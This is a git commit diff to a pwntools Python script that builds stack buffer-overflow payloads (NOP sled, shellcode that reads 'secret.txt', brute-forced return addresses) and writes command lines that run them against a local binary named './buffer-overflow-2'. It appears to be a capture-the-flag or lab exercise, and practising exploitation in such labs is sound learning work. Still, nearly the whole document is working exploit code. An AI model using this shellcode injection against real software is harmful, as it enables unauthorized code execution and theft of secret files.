7c065b297c4e2e43b81240b83b396692fae8261d
ivfiev <filjko@ya.ru>
2024-06-10 22:28:02 +0100

    wip

--- pwntools/main.py
+++ pwntools/main.py
@@ -3,21 +3,24 @@ from pwn import *
 context.update(arch='amd64', os='linux')
 
 nop = asm(shellcraft.nop())
-code = asm(shellcraft.cat('./secret.txt\n'))
-program_name = "./buffer-overflow"
-addr_offset = 140
-addr = 0xffffffffffffe300 - 200
+code = asm(shellcraft.cat('secret.txt'))
+program_name = "./buffer-overflow-2"
+addr_offset = 163
+addr = 0x00007fffffffe320 - 300
 
 bytes = addr_offset - len(code)
-sled = int(bytes / 3 * 2)
+sled = int(bytes / 2)
 rem = bytes - sled
 
 f = open("./output", "w")
 lines = ""
 
-for x in range(25):
-    shc = nop * sled + code + nop * rem + p64(addr + 16 * x)
+for x in range(20):
+    shc = nop * sled + code + nop * rem + p64(addr + x * 16)
+    print(len(shc))
     lines += f"""{program_name} ${str(shc)[1:]}\n"""
+
+lines += "dmesg | tail -n 1\n"
 
 f.write(lines)
 f.close()
